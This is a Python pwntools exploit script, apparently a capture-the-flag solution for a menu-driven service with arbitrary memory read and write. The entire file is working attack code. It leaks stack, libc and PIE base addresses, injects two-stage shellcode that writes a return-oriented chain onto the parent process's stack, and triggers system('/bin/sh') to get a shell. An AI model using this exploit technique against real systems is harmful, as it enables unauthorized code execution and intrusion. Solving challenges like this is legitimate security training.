#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

context.arch = "amd64"


def vm_read(addr):

    r.recvuntil(b"Choice: \n")
    r.sendline(b"1")
    r.recvuntil(b"Address: \n")
    r.sendline(f"{addr:x}".encode())
    value = int(r.recvline().split(b": ")[1], 16)
    return value


def vm_write(addr, value):

    r.recvuntil(b"Choice: \n")
    r.sendline(b"2")
    r.recvuntil(b"Value: \n")
    r.sendline(f"{value:x}".encode())
    r.recvuntil(b"Address: \n")
    r.sendline(f"{addr:x}".encode())


def vm_write_bytes(addr, data):

    for i in range(0, len(data), 8):
        value = int.from_bytes(data[i:i + 8], "little")
        vm_write(addr + i, value)


# r = process(["./challenge_patched"])
r = remote(HOST, PORT)

libc = ELF("libc.so.6")

stack_leak = vm_read(0)
print(f"Stack leak: 0x{stack_leak:016x}")

libc_leak = vm_read(stack_leak - 0x70)
libc_base = libc_leak - 0x29e40
print(f"libc base: 0x{libc_base:016x}")
libc.address = libc_base

# for i in range(0, 0x80):
#     addr = stack_leak - 0x8 * i
#     print(f"0x{i:x}: {vm_read(addr):016x}")

pie_base = vm_read(stack_leak - 0x20) - 0x1285
print(f"PIE base: 0x{pie_base:016x}")

# Write right after usleep

writev_helper = pie_base + 0x14fc

# child will a ropchain to parent stack

ropchain = p64(libc_base + 0x2a3e6)  # ret
ropchain += p64(libc_base + 0x2a3e5)  # pop rdi ; ret
ropchain += p64(next(libc.search(b"/bin/sh\0")))
ropchain += p64(libc.sym["system"])

shellcode = b""

print(f"Gonna write ropchain at 0x{stack_leak - 0x110:016x}")
for i in range(0, len(ropchain), 8):
    shellcode += asm(f"""
    mov rax, SYS_getppid
    syscall
    mov rdi, rax
    mov r12, 0x{writev_helper:016x}
    mov rsi, 0x{stack_leak - 0x110 + i:016x}
    mov rdx, 0x{int.from_bytes(ropchain[i:i + 8], "little"):016x}
    call r12
    """)

shellcode += asm("ret")

while len(shellcode) % 8 != 0:
    shellcode += b"\x90"

vm_write_bytes(pie_base + 0x2800, shellcode)
vm_write_bytes(pie_base + 0x1484 + 8, asm(f"mov rax, 0x{pie_base + 0x2800:016x}; jmp rax"))  # we don't have enough space so 2 stages
vm_write_bytes(pie_base + 0x1484, b"\x90" * 8)  # last write to trigger

r.recvuntil(b"Choice: \n")
r.sendline(b"3")

r.sendline(b"./submitter")

# print(r.recv(4096))
# print(r.recv(4096))
# print(r.recv(4096))
# print(r.recv(4096))

for i in range(0x20):
    d = r.recv(4096, timeout=3)
    # if b"Menu" not in d:
    print(d)

r.close()
